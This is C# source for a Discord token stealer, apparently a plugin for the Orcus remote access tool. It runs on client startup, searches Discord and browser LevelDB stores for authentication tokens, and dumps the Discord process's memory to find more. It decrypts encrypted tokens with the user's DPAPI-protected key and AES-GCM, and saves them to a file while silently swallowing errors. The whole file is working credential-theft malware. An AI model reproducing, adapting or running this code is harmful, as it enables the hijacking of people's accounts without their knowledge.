using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Orcus.Plugins;

namespace DiscordTokenStealer
{
    public class DiscordTokenStealer : ClientController
    {
        [DllImport("dbghelp.dll", SetLastError = true)]
        private static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            UInt32 ProcessId,
            SafeHandle hFile,
            MINIDUMP_TYPE DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);

        public enum MINIDUMP_TYPE
        {
            MiniDumpWithFullMemory = 0x00000002,
        }

        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            string clientPath = clientStartup.ClientPath;
            string outputFile = Path.Combine(Path.GetDirectoryName(clientPath), "discordtokengrab.txt");

            try
            {
                var tokens = StealTokens();
                SaveToFile(tokens, outputFile);
                return true;
            }
            catch (Exception)
            {
                // Silent fail
                try
                {
                    File.WriteAllText(outputFile, "Nothing found");
                    return true;
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }

        private List<string> StealTokens()
        {
            var foundTokens = new List<string>();

            try
            {
                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                Dictionary<string, string> paths = new Dictionary<string, string>
                {
                    { "Discord", Path.Combine(roaming, "discord") },
                    { "Discord Canary", Path.Combine(roaming, "discordcanary") },
                    { "Discord PTB", Path.Combine(roaming, "discordptb") },
                    { "Lightcord", Path.Combine(roaming, "Lightcord") },

                    { "Chrome", Path.Combine(local, "Google", "Chrome", "User Data", "Default") },
                    { "Chrome SxS", Path.Combine(local, "Google", "Chrome SxS", "User Data") },

                    { "Opera", Path.Combine(roaming, "Opera Software", "Opera Stable") },
                    { "Opera GX", Path.Combine(roaming, "Opera Software", "Opera GX Stable") },

                    { "Amigo", Path.Combine(local, "Amigo", "User Data") },
                    { "Torch", Path.Combine(local, "Torch", "User Data") },
                    { "Kometa", Path.Combine(local, "Kometa", "User Data") },
                    { "Orbitum", Path.Combine(local, "Orbitum", "User Data") },
                    { "CentBrowser", Path.Combine(local, "CentBrowser", "User Data") },
                    { "7Star", Path.Combine(local, "7Star", "7Star", "User Data") },
                    { "Sputnik", Path.Combine(local, "Sputnik", "Sputnik", "User Data") },
                    { "Vivaldi", Path.Combine(local, "Vivaldi", "User Data", "Default") },

                    { "Epic Privacy Browser", Path.Combine(local, "Epic Privacy Browser", "User Data") },
                    { "Microsoft Edge", Path.Combine(local, "Microsoft", "Edge", "User Data", "Default") },
                    { "Uran", Path.Combine(local, "uCozMedia", "Uran", "User Data", "Default") },
                    { "Brave", Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data", "Default") },
                    { "Iridium", Path.Combine(local, "Iridium", "User Data", "Default") }
                };

                foreach (var path in paths)
                {
                    var tokensFromPath = LdbGrab(path.Value);
                    foundTokens.AddRange(tokensFromPath);
                }

                var dumpTokens = GetTokensFromMemoryDump();
                foundTokens.AddRange(dumpTokens);
            }
            catch (Exception)
            {
                // Silent fail
            }

            return foundTokens.Distinct().ToList();
        }

        private void SaveToFile(List<string> tokens, string outputFile)
        {
            if (tokens.Count > 0)
            {
                File.WriteAllLines(outputFile, tokens);
            }
            else
            {
                File.WriteAllText(outputFile, "Nothing found");
            }
        }

        private List<string> LdbGrab(string path)
        {
            var tokens = new List<string>();

            if (!Directory.Exists(path))
            {
                return tokens;
            }

            try
            {
                string[] dbFiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
                Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
                Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                foreach (var file in dbFiles)
                {
                    try
                    {
                        string contents = File.ReadAllText(file);

                        Match match1 = BasicRegex.Match(contents);
                        if (match1.Success)
                        {
                            tokens.Add(match1.Value);
                        }

                        Match match2 = NewRegex.Match(contents);
                        if (match2.Success)
                        {
                            tokens.Add(match2.Value);
                        }

                        Match match3 = EncryptedRegex.Match(contents);
                        if (match3.Success)
                        {
                            string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                            if (!string.IsNullOrEmpty(token))
                                tokens.Add(token);
                        }
                    }
                    catch (Exception)
                    {
                        // Silent fail
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }

            return tokens;
        }

        private List<string> GetTokensFromMemoryDump()
        {
            var tokens = new List<string>();
            string discord_dump_path = Path.GetTempFileName();

            try
            {
                foreach (Process proid in Process.GetProcessesByName("discord"))
                {
                    UInt32 ProcessId = (uint)proid.Id;
                    IntPtr hProcess = proid.Handle;
                    MINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;

                    using (FileStream procdumpFileStream = File.Create(discord_dump_path))
                    {
                        MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, DumpType, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    }

                    var dumpTokens = ExtractToken(discord_dump_path);
                    tokens.AddRange(dumpTokens);

                    File.Delete(discord_dump_path);
                    break;
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
            finally
            {
                if (File.Exists(discord_dump_path))
                    File.Delete(discord_dump_path);
            }

            return tokens;
        }

        private List<string> ExtractToken(string fn)
        {
            var tokens = new List<string>();

            try
            {
                FileInfo info = new FileInfo(fn);
                Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
                Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                if (info.Exists)
                {
                    string contents = File.ReadAllText(info.FullName);

                    Match match1 = BasicRegex.Match(contents);
                    if (match1.Success)
                    {
                        tokens.Add(match1.Value);
                    }

                    Match match2 = NewRegex.Match(contents);
                    if (match2.Success)
                    {
                        tokens.Add(match2.Value);
                    }

                    Match match3 = EncryptedRegex.Match(contents);
                    if (match3.Success)
                    {
                        string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                        if (!string.IsNullOrEmpty(token))
                            tokens.Add(token);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }

            return tokens;
        }

        private byte[] DecyrptKey(string path)
        {
            try
            {
                if (!File.Exists(path))
                    return null;

                dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
                return ProtectedData.Unprotect(
                    Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(),
                    null,
                    DataProtectionScope.CurrentUser);
            }
            catch (Exception)
            {
                return null;
            }
        }

        private string DecryptToken(byte[] buffer)
        {
            try
            {
                byte[] EncryptedData = buffer.Skip(15).ToArray();
                var key = DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State");

                if (key == null)
                    return null;

                AeadParameters Params = new AeadParameters(
                    new KeyParameter(key),
                    128,
                    buffer.Skip(3).Take(12).ToArray(),
                    null);

                GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
                BlockCipher.Init(false, Params);

                byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
                BlockCipher.DoFinal(DecryptedBytes,
                    BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));

                return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
}